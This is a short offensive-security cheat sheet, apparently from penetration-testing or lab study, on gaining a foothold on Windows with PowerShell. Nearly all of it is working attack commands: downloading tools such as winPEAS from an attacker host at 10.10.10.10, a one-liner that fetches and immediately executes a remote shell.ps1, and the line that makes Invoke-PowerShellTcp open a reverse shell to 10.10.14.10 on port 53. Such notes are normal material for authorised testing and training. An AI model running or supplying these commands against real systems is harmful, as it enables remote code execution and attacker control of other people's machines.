# PowerShell
## Gaining Foothold
Using PowerShell, you can download and execute files just like you would with Netcat.
```powershell
# Download Files
powershell -c "(new-object system.net.webclient).downloadfile('http://10.10.10.10/wget.exe','C:\Users\offsec\Desktop\wget.exe')"

# Download files
Invoke-WebRequest -Uri "http://10.10.10.10/winPEASany.exe" -OutFile "C:\windows\system32\inetsrv\winpeasany.exe"

# Download and execute file immediately
powershell iex(new-object net.webclient).downloadstring('http://10.10.10.10/shell.ps1')
```

Invoke-PowerShellTcp.ps1 is usually my go to powershell script for getting a reverse shell. Just remember to add `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 53` to the bottom of the script.

